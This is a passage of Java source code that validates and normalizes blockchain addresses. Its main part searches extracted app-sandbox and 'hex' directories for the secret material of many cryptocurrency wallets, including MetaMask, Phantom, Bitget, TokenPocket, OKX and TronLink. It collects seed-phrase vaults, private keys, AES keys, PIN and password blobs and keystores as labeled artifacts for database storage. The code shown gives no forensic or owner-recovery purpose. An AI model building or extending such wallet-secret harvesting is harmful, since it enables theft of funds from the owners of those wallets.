            case "tron":
                return TRON_ADDR.matcher(addr).matches() || addr.toLowerCase(Locale.ROOT).startsWith("41");
            case "ton":
                return TON_ADDR.matcher(addr).matches();
            case "sol":
                return addr.length() >= 32 && addr.length() <= 44 && !addr.startsWith("0x");
            default:
                return !addr.isEmpty();
        }
    }

    private static String normalizeAddress(String chain, String addr) {
        if ("eth".equals(chain) || "bsc".equals(chain)) {
            return addr.startsWith("0x") ? addr : "0x" + addr;
        }
        return addr;
    }

    private static String normalizeChainName(String raw) {
        if (raw == null || raw.isEmpty()) {
            return null;
        }
        String c = raw.trim().toLowerCase(Locale.ROOT);
        switch (c) {
            case "eth":
            case "ethereum":
                return "eth";
            case "bsc":
            case "bnb":
            case "binance":
                return "bsc";
            case "btc":
            case "bitcoin":
                return "btc";
            case "tron":
            case "trx":
                return "tron";
            case "sol":
            case "solana":
                return "sol";
            case "ton":
                return "ton";
            default:
                if (c.length() <= 12 && c.matches("[a-z0-9_]+")) {
                    return c;
                }
                return null;
        }
    }

    private static String tronHexToBase58(String hex) {
        if (hex == null) {
            return null;
        }
        String h = hex.trim();
        if (h.startsWith("0x") || h.startsWith("0X")) {
            h = h.substring(2);
        }
        if (h.length() == 40) {
            h = "41" + h;
        }
        if (h.length() != 42 || !h.regionMatches(true, 0, "41", 0, 2)) {
            return null;
        }
        try {
            byte[] payload = parseHexBytes(h);
            if (payload.length != 21 || payload[0] != 0x41) {
                return null;
            }
            byte[] addr20 = Arrays.copyOfRange(payload, 1, 21);
            return BIP32Util.base58CheckEncode(new byte[]{0x41}, addr20);
        } catch (Exception e) {
            return null;
        }
    }

    private static byte[] parseHexBytes(String hex) {
        if (hex == null || (hex.length() & 1) == 1) {
            throw new IllegalArgumentException("bad hex");
        }
        byte[] out = new byte[hex.length() / 2];
        for (int i = 0; i < out.length; i++) {
            int hi = Character.digit(hex.charAt(i * 2), 16);
            int lo = Character.digit(hex.charAt(i * 2 + 1), 16);
            if (hi < 0 || lo < 0) {
                throw new IllegalArgumentException("bad hex");
            }
            out[i] = (byte) ((hi << 4) | lo);
        }
        return out;
    }

    private static List<String> collectMatches(Pattern p, String text) {
        List<String> list = new ArrayList<>();
        java.util.regex.Matcher m = p.matcher(text);
        while (m.find()) {
            list.add(m.group());
        }
        return list;
    }

    private static final class ChainAddressAccumulator {
        final Map<String, LinkedHashSet<String>> byChain = new LinkedHashMap<>();
        final List<Map<String, String>> sources = new ArrayList<>();

        void add(String chain, String address, String sourceKind) {
            if (chain == null || address == null || address.isEmpty()) {
                return;
            }
            byChain.computeIfAbsent(chain, k -> new LinkedHashSet<>()).add(address);
            Map<String, String> src = new LinkedHashMap<>();
            src.put("artifact_kind", sourceKind);
            src.put("chain", chain);
            src.put("address", address);
            sources.add(src);
        }

        Map<String, List<String>> toChainsMap() {
            Map<String, List<String>> out = new LinkedHashMap<>();
            for (Map.Entry<String, LinkedHashSet<String>> e : byChain.entrySet()) {
                out.put(e.getKey(), new ArrayList<>(e.getValue()));
            }
            return out;
        }

        boolean isEmpty() {
            return byChain.isEmpty();
        }
    }

    private static boolean startsWithAscii(byte[] data, String s) {
        if (data == null || s == null || data.length < s.length()) return false;
        for (int i = 0; i < s.length(); i++) {
            if ((data[i] & 0xFF) != (s.charAt(i) & 0xFF)) return false;
        }
        return true;
    }

    /** 可打印 UTF-8 文本；含过多控制字符则视为二进制 */
    private static String tryUtf8Text(byte[] data) {
        if (data == null || data.length == 0) return null;
        int sample = Math.min(data.length, 4096);
        int ctrl = 0;
        for (int i = 0; i < sample; i++) {
            int b = data[i] & 0xFF;
            if (b == 0) return null;
            if (b < 0x09 || (b > 0x0D && b < 0x20 && b != 0x1B)) ctrl++;
        }
        if (ctrl * 20 > sample) return null;
        try {
            return new String(data, StandardCharsets.UTF_8);
        } catch (Exception e) {
            return null;
        }
    }

    /** 从二进制中提取可打印 ASCII 串（便于 bplist/blob 人工查看） */
    private static List<String> extractAsciiStrings(byte[] data, int minLen, int maxCount) {
        LinkedHashSet<String> set = new LinkedHashSet<>();
        StringBuilder sb = new StringBuilder();
        for (byte value : data) {
            int b = value & 0xFF;
            if (b >= 0x20 && b < 0x7F) {
                sb.append((char) b);
            } else {
                if (sb.length() >= minLen) {
                    set.add(sb.toString());
                    if (set.size() >= maxCount) break;
                }
                sb.setLength(0);
            }
        }
        if (sb.length() >= minLen && set.size() < maxCount) {
            set.add(sb.toString());
        }
        return new ArrayList<>(set);
    }

    // ------------------------------------------------------------------ hex

    private void collectHex(Path hex, Set<String> skip, List<Artifact> out) throws IOException {
        if (!skip.contains("metamask")) {
            addMatching(hex.resolve("metamask"), "metamask", "mnemonic", "metamask_vault_backup",
                    name -> name.contains("vault_backup"), out);
        }
        if (!skip.contains("solflare")) {
            Path d = hex.resolve("solflare");
            addMatching(d, "solflare", "mnemonic", "solflare_default_encrypted",
                    name -> name.contains("default_encrypted"), out);
            addMatching(d, "solflare", "mnemonic", "solflare_passcode_vault",
                    name -> name.contains("passcode_vault"), out);
        }
        if (!skip.contains("tonkeeper")) {
            addMatching(hex.resolve("tonkeeper"), "tonkeeper", "mnemonic", "tonkeeper_encrypted_chunk",
                    name -> name.contains("encrypted_chunk"), out);
        }
        if (!skip.contains("mytonwallet")) {
            Path d = hex.resolve("mytonwallet");
            // "accounts" 常以 hex 名 6163636f756e7473 落盘
            addMatching(d, "mytonwallet", "mnemonic", "mytonwallet_accounts",
                    name -> name.contains("6163636f756e7473") || name.contains("accounts"), out);
            addMatching(d, "mytonwallet", "mnemonic", "mytonwallet_secret",
                    name -> name.startsWith("secret_") || name.contains("secret_0")
                            || name.contains("secret%23") || name.contains("secret#"), out);
        }
        if (!skip.contains("okx")) {
            Path d = hex.resolve("okx");
            addMatching(d, "okx", "mnemonic", "okx_se_ptc",
                    name -> name.contains("se-ptc") || name.contains("encrypted"), out);
            addMatching(d, "okx", "mnemonic", "okx_aes_gcm_key",
                    name -> name.contains("aes-gcm") || name.contains("aes_gcm"), out);
        }
        if (!skip.contains("phantom")) {
            addMatching(hex.resolve("phantom"), "phantom", "mnemonic", "phantom_vault_seed",
                    name -> name.contains("7661756c742e73656564")
                            || name.contains("vault") || name.contains("seed") || name.endsWith(".json"), out);
        }
        if (!skip.contains("uniswap")) {
            addMatching(hex.resolve("uniswap"), "uniswap", "private_key", "uniswap_private_key",
                    name -> name.contains("privatekey"), out);
            addMatching(hex.resolve("uniswap"), "uniswap", "mnemonic", "uniswap_mnemonic_blob",
                    name -> name.contains("mnemonic"), out);
        }
        if (!skip.contains("exodus")) {
            addMatching(hex.resolve("exodus"), "exodus", "mnemonic", "exodus_unused_data",
                    name -> name.contains("unused_data") || name.contains("seed") || name.contains("mnemonic"), out);
        }
        if (!skip.contains("tronlink")) {
            addMatching(hex.resolve("tronlink"), "tronlink", "mnemonic", "tronlink_hdwallet",
                    name -> name.contains("hdwallet") || name.contains("tronlink"), out);
        }
        if (!skip.contains("bitget")) {
            Path d = hex.resolve("bitget");
            addMatching(d, "bitget", "mnemonic", "bitget_aes_key",
                    name -> name.contains("aeskey") || name.equals("aeskeyname_data.txt")
                            || name.startsWith("aeskeyname"), out);
            addMatching(d, "bitget", "mnemonic", "bitget_bg_blob",
                    name -> name.contains("bg@@") || name.contains("bg_bg_") || name.startsWith("bg_"), out);
            addMatching(d, "bitget", "mnemonic", "bitget_prefs",
                    name -> name.contains("com.bitkeep.os"), out);
            addMatching(d, "bitget", "mnemonic", "bitget_pin_or_mnemonic_key",
                    name -> (name.contains("mnemonic") || name.contains("pin") || name.contains("password"))
                            && !name.endsWith(".txt.crc"), out);
        }
    }

    // ------------------------------------------------------------------ sandbox

    private void collectSandbox(Path sandbox, Set<String> skip, List<Artifact> out) throws IOException {
        if (!skip.contains("metamask")) {
            addMatching(sandbox.resolve("metamask"), "metamask", "mnemonic", "metamask_keyring_controller",
                    name -> name.contains("keyringcontroller"), out);
        }
        if (!skip.contains("tronlink")) {
            // UTC keystore 在 Documents/keystore/ 下，需 depth>=4
            addMatchingDeep(sandbox.resolve("tronlink"), "tronlink", "mnemonic", "tronlink_keystore",
                    name -> name.contains("utc--"), 5, out);
        }
        if (!skip.contains("coin98")) {
            // mmkv 在 Documents/mmkv/ 下，需 depth>=3
            addMatchingDeep(sandbox.resolve("coin98"), "coin98", "mnemonic", "coin98_mmkv_enc",
                    name -> name.equals("mmkv.default.enc") || name.endsWith(".enc"), 4, out);
        }
        if (!skip.contains("tonhub")) {
            addMatching(sandbox.resolve("tonhub"), "tonhub", "mnemonic", "tonhub_mmkv",
                    name -> name.equals("mmkv.default") || name.startsWith("mmkv."), out);
            addMatching(sandbox.resolve("ton_wallet"), "tonhub", "mnemonic", "tonhub_mmkv",
                    name -> name.equals("mmkv.default") || name.startsWith("mmkv."), out);
        }
        if (!skip.contains("tonkeeper")) {
            addMatching(sandbox.resolve("tonkeeper"), "tonkeeper", "mnemonic", "tonkeeper_sandbox",
                    name -> name.contains("mmkv") || name.contains("encrypt") || name.endsWith(".plist"), out);
        }
        if (!skip.contains("okx")) {
            addMatchingDeep(sandbox.resolve("okx"), "okx", "mnemonic", "okx_sandbox_plist",
                    name -> name.endsWith(".plist") && name.contains("okex"), 3, out);
        }
        if (!skip.contains("bitget")) {
            addMatchingDeep(sandbox.resolve("bitget"), "bitget", "mnemonic", "bitget_db",
                    name -> name.equals("bitkeep.db") || name.endsWith("bitkeep.db"), 4, out);
            addMatchingDeep(sandbox.resolve("bitget"), "bitget", "mnemonic", "bitget_prefs",
                    name -> name.contains("com.bitkeep.os") && name.endsWith(".plist"), 4, out);
            addMatchingDeep(sandbox.resolve("bitget"), "bitget", "mnemonic", "bitget_config_wallet",
                    name -> name.contains("kconfigwallet"), 4, out);
        }
        if (!skip.contains("imtoken")) {
            addMatchingDeep(sandbox.resolve("imtoken"), "imtoken", "mnemonic", "imtoken_als",
                    name -> !name.contains("realm") && !name.equals("manifest.json")
                            && (name.endsWith(".json") || name.matches("[0-9a-f]{32}")), 4, out);
        }
        if (!skip.contains("tokenpocket")) {
            Path f4 = sandbox.resolve("tokenpocket").resolve("Documents").resolve("F4SeCyr");
            addMatching(f4, "tokenpocket", "mnemonic", "tokenpocket_f4secyr", name -> true, out);
            addMatchingDeep(sandbox.resolve("tokenpocket"), "tokenpocket", "mnemonic", "tokenpocket_prefs",
                    name -> name.contains("com.global.wallet") && name.endsWith(".plist"), 4, out);
        }
        if (!skip.contains("mytonwallet")) {
            addMatching(sandbox.resolve("mytonwallet"), "mytonwallet", "mnemonic", "mytonwallet_sandbox",
                    name -> name.contains("secret") || name.contains("enclave") || name.endsWith(".plist"), out);
        }
        if (!skip.contains("solflare")) {
            addMatching(sandbox.resolve("solflare"), "solflare", "mnemonic", "solflare_sandbox",
                    name -> name.endsWith(".plist") || name.contains("encrypt"), out);
        }
    }

    // ------------------------------------------------------------------ helpers

    private interface NamePred {
        boolean test(String lowerName);
    }

    private void addMatching(Path dir, String wallet, String hexType, String artifactKind,
                             NamePred pred, List<Artifact> out) throws IOException {
        addMatchingDeep(dir, wallet, hexType, artifactKind, pred, 2, out);
    }

    private void addMatchingDeep(Path dir, String wallet, String hexType, String artifactKind,
                                 NamePred pred, int maxDepth, List<Artifact> out) throws IOException {
        if (dir == null || !Files.isDirectory(dir)) {
            return;
        }
        try (Stream<Path> walk = Files.walk(dir, Math.max(1, maxDepth))) {
            walk.filter(Files::isRegularFile).forEach(p -> {
                String name = p.getFileName().toString();
                String lower = name.toLowerCase(Locale.ROOT);
                if (lower.endsWith(".txt") && Files.exists(Paths.get(p.toString().replaceAll("\\.txt$", "")))) {
                    return;
                }
                if (lower.endsWith(".crc")) {
                    return;
                }
                if (!pred.test(lower)) {
                    return;
                }
                addFile(p, wallet, hexType, artifactKind, out);
            });
        }
    }

    private void addFile(Path file, String wallet, String hexType, String artifactKind, List<Artifact> out) {
        try {
            long size = Files.size(file);
            if (size <= 0 || size > MAX_CONTENT_BYTES) {
                if (size > MAX_CONTENT_BYTES) {
                    log.debug("【waitbound】文件过大跳过 wallet={} file={} size={}", wallet, file.getFileName(), size);
                }
                return;
            }
            byte[] raw = Files.readAllBytes(file);
            if (raw.length == 0) {
                return;
            }
            Artifact a = new Artifact();
            a.wallet = wallet;
            a.hexType = hexType;
            a.artifactKind = artifactKind;
            a.encryptAlgo = resolveEncryptAlgo(artifactKind, raw);
            a.contentBytes = raw;
            a.sourceFile = file;
            out.add(a);
        } catch (Exception e) {
            log.debug("【waitbound】读文件失败 file={} err={}", file, e.toString());
        }
    }

    private static String sanitizePathPart(String s) {
        if (s == null || s.isEmpty()) {
            return "unknown";
        }
        return s.replaceAll("[^a-zA-Z0-9._\\-]", "_");
    }

    private static String sanitizeFileName(String s) {
        if (s == null || s.isEmpty()) {
            return "blob.bin";
        }
        String n = s.replaceAll("[^a-zA-Z0-9._\\-]", "_");
        if (n.length() > 120) {
            int dot = n.lastIndexOf('.');
            String ext = dot > 0 ? n.substring(dot) : "";
            n = n.substring(0, 120 - ext.length()) + ext;
        }
        return n;
    }

    private static String shortHash(byte[] data) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] d = md.digest(data);
            StringBuilder sb = new StringBuilder(16);
            for (int i = 0; i < 8; i++) {
                int v = d[i] & 0xFF;
                sb.append(HEX[v >>> 4]).append(HEX[v & 0x0F]);
            }
            return sb.toString();
        } catch (Exception e) {
            return Integer.toHexString(data.length);
        }
    }

    private static final class Artifact {
        String wallet;
        String hexType;       // mnemonic / private_key
        String artifactKind;  // 材料标签（仅优先级/文件名）
        String encryptAlgo;   // 入库 encrypt_type：AES / CryptoJS-AES / …
        byte[] contentBytes;
        Path sourceFile;
    }
}
